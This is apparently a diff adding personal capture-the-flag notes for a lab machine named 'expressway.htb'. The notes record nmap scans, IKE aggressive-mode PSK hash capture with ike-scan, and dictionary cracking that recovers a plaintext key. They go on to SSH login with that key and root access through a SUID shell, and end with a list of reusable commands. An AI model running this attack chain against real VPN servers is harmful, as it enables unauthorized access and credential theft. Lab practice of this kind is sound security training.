@@ -1,0 +1,82 @@
+# nmap
+┌──(kali㉿kali)-[~/vpn]
+└─$ nmap -p- 10.10.11.87 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 10:29 EDT
+Nmap scan report for 10.10.11.87
+Host is up (0.099s latency).
+Not shown: 65423 closed tcp ports (reset), 111 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+Nmap done: 1 IP address (1 host up) scanned in 72.05 seconds
+
+┌──(kali㉿kali)-[~/vpn]
+└─$ nmap -p- -sU 10.10.11.87 --min-rate=1000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 10:31 EDT
+Warning: 10.10.11.87 giving up on port because retransmission cap hit (10).
+Stats: 0:11:38 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 97.64% done; ETC: 10:43 (0:00:17 remaining)
+Stats: 0:11:39 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 97.76% done; ETC: 10:43 (0:00:16 remaining)
+Nmap scan report for 10.10.11.87
+Host is up (0.18s latency).
+Not shown: 64862 open|filtered udp ports (no-response), 671 closed udp ports (port-unreach)
+PORT      STATE SERVICE
+500/udp   open  isakmp
+60281/udp open  unknown
+Nmap done: 1 IP address (1 host up) scanned in 722.90 seconds
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
+#isakmp
+┌──(kali㉿kali)-[~/vpn]
+└─$ ike-scan --aggressive 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=8064cb5abb418593) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_>
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.193 seconds (5.19 hosts/sec).  1 returned handshake; 0 returned notify
+
+┌──(kali㉿kali)-[~/vpn]
+└─$ ike-scan -M -2 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Notify message 14 (NO_PROPOSAL_CHOSEN)
+        HDR=(CKY-R=587be1d2f345bf1d, IKEv2)
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.117 seconds (8.56 hosts/sec).  0 returned handshake; 1 returned notify
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
+#got these...
+
+#saving the file in .psk file to crack later
+┌──(kali㉿kali)-[~/vpn]
+└─$ sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=fe77858e1ee5313d) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_>
+Ending ike-scan 1.9.6: 1 hosts scanned in 1.377 seconds (0.73 hosts/sec).  1 returned handshake; 0 returned notify
+
+#cracking the hash
+┌──(kali㉿kali)-[~/vpn]
+└─$ psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
+Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
+Running in dictionary cracking mode
+key "freakingrockstarontheroad" matches SHA1 hash 0e1bfcc0166cb39dda22280ecd2fe6ae68015789
+Ending psk-crack: 8045040 iterations in 7.144 seconds (1126147.02 iterations/sec)
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
+#ssh
+└─$ ssh ike@expressway.htb
+ike@expressway.htb's password:
+Last login: Sat Sep 27 15:35:35 BST 2025 from 10.10.16.35 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
+#priv.esc
+ike@expressway:~$ /usr/local/bin/.suidshell
+root@expressway:/# cd /root
+root@expressway:/root# ls
+root.txt
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
+#rough...
+sudo nmap -sU -p- --max-retries 1 --min-rate 500 <target>
+
+sudo nmap -sU -Pn -p 53,67,68,69,111,123,137-139,161-162,500,514,520,1194,1701,1812-1813,1900,3478,4500,5060-5061,5353,10000,33434-33440 \
+  --reason --max-retries 1 --min-rate 200 -sV --script=default <target>
+
+sudo nmap -sU -Pn -p 53,67,68,69,111,123,137-139,161-162,500,514,520,1194,1701,1812-1813,1900,3478,4500,5060-5061,5353,10000,33434-33440 \ --reason --max-retries 1 --min-rate 200 -sV --script=default <target>
+
+sudo ike-scan -A expressway.htb --id=ike@expressway.htb -Pike.psk
+
+psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
+_________________________________________________________________________________________________________________________________________________________________________________________________________________
